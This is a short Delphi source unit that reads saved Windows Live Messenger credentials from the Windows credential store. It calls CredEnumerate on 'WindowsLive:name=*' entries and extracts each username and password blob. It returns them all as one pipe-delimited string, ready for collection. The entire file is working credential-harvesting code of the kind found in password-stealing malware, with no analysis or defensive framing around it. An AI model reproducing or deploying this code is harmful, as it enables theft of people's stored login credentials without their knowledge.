unit uMessenger;

interface

uses
  Windows, CryptApi;

function GetWindowsLiveMessengerPasswords :String;

implementation

type
  PTChar = ^Char;

function DumpData(Buffer: Pointer; BufLen: DWord): String;
var
  i, j, c: Integer;
begin
  c := 0;
Result := '';
  for i := 1 to BufLen div 16 do begin
    for j := c to c + 15 do
      if (PByte(Integer(Buffer) + j)^ < $20) or (PByte(Integer(Buffer) + j)^ > $FA) then
        Result := Result
      else
        Result := Result + PTChar(Integer(Buffer) + j)^;
    c := c + 16;
  end;
  if BufLen mod 16 <> 0 then begin
    for i := BufLen mod 16 downto 1 do begin
      if (PByte(Integer(Buffer) + Integer(BufLen) - i)^ < $20) or (PByte(Integer(Buffer) + Integer(BufLen) - i)^ > $FA) then
        Result := Result
      else
        Result := Result + PTChar(Integer(Buffer) + Integer(BufLen) - i)^;
        end;
  end;
end;


function GetWindowsLiveMessengerPasswords :String;
var
  CredentialCollection: PCREDENTIAL;
  Count, i: DWORD;
begin
  CredEnumerate('WindowsLive:name=*', 0, Count, CredentialCollection);
  if Count = 0 then exit;
  Result := '';
  for I:= 0 to count -1 do begin
    Result := Result+'|Windows Live Messenger|';
    Result := Result+CredentialCollection[i].UserName+'|';
    Result := Result+Pchar(DumpData(CredentialCollection[i].CredentialBlob,CredentialCollection[i].CredentialBlobSize));
  end;
end;

end.
